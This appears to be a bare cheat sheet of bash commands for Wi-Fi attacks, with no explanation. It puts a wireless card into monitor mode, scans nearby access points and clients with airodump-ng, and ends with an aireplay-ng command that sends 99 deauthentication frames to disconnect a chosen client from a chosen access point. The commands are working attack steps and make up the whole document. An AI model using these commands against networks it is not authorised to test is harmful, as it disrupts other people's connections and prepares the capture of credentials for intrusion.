```bash
ip link set wlan0 down
iw dev wlan0 set type monitor
ip link set wlan0 up
```

```bash
airmon-ng start wlan0
```

```bash
airodump-ng wlan0 --band a --manufacturer --beacons --showack

airodump-ng wlan0 --band bg --manufacturer --beacons --showack
```

```bash
iwconfig wlan0 channel 4

aireplay-ng -0 99 -a BSSID -c TARGET wlan0
```
